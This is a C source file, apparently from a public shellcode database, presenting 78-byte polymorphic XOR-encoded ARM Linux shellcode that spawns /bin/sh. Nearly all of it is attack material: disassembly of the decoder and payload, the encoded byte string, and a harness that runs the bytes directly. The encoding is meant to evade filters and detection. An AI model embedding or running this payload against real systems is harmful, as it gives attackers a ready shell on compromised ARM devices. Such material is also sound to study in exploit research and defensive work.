/*
Title:     Linux/ARM - Polymorphic execve("/bin/sh", ["/bin/sh"], NULL); - XOR 88 encoded - 78 bytes
Date:      2010-06-28
Tested on: ARM926EJ-S rev 5 (v5l)

Author:    Jonathan Salwan
Web:       http://shell-storm.org | http://twitter.com/jonathansalwan

! Database of shellcodes http://www.shell-storm.org/shellcode/



== Disassembly of XOR decoder ==

00008054 <debut-0x8>:
    8054:	e28f6024 	add	r6, pc, #36	; 0x24
    8058:	e12fff16 	bx	r6

0000805c <debut>:
    805c:	e3a040e3 	mov	r4, #227	; 0xe3

00008060 <boucle>:
    8060:	e3540c01 	cmp	r4, #256	; 0x100
    8064:	812fff1e 	bxhi	lr
    8068:	e24440e3 	sub	r4, r4, #227	; 0xe3
    806c:	e7de5004 	ldrb	r5, [lr, r4]
    8070:	e2255058 	eor	r5, r5, #88	; 0x58
    8074:	e7ce5004 	strb	r5, [lr, r4]
    8078:	e28440e4 	add	r4, r4, #228	; 0xe4
    807c:	eafffff7 	b	8060 <boucle>
    8080:	ebfffff5 	bl	805c <debut>


== Disassembly of execve("/bin/sh", ["/bin/sh"], NULL) ==

00008054 <_start>:
    8054:	e28f6001 	add	r6, pc, #1	; 0x1
    8058:	e12fff16 	bx	r6
    805c:	4678      	mov	r0, pc
    805e:	300a      	adds	r0, #10
    8060:	9001      	str	r0, [sp, #4]
    8062:	a901      	add	r1, sp, #4
    8064:	1a92      	subs	r2, r2, r2
    8066:	270b      	movs	r7, #11
    8068:	df01      	svc	1
    806a:	2f2f      	cmp	r7, #47
    806c:	6962      	ldr	r2, [r4, #20]
    806e:	2f6e      	cmp	r7, #110
    8070:	6873      	ldr	r3, [r6, #4]


*/

#include <stdio.h>


char SC[] = "\x24\x60\x8f\xe2"
            "\x16\xff\x2f\xe1"
            "\xe3\x40\xa0\xe3"
            "\x01\x0c\x54\xe3"
            "\x1e\xff\x2f\x81"
            "\xe3\x40\x44\xe2"
            "\x04\x50\xde\xe7"
            "\x58\x50\x25\xe2"
            "\x04\x50\xce\xe7"
            "\xe4\x40\x84\xe2"
            "\xf7\xff\xff\xea"
            "\xf5\xff\xff\xeb"
            "\x59\x68\xd7\xba"
            "\x4b\xa7\x77\xb9"
            "\x20\x1e\x52\x68"
            "\x59\xc8\x59\xf1"
            "\xca\x42\x53\x7f"
            "\x59\x87\x77\x77"
            "\x3a\x31\x36\x77"
            "\x2b\x30";


int main(void)
{
        fprintf(stdout,"Length: %d\n",strlen(SC));
        (*(void(*)()) SC)();
return 0;
}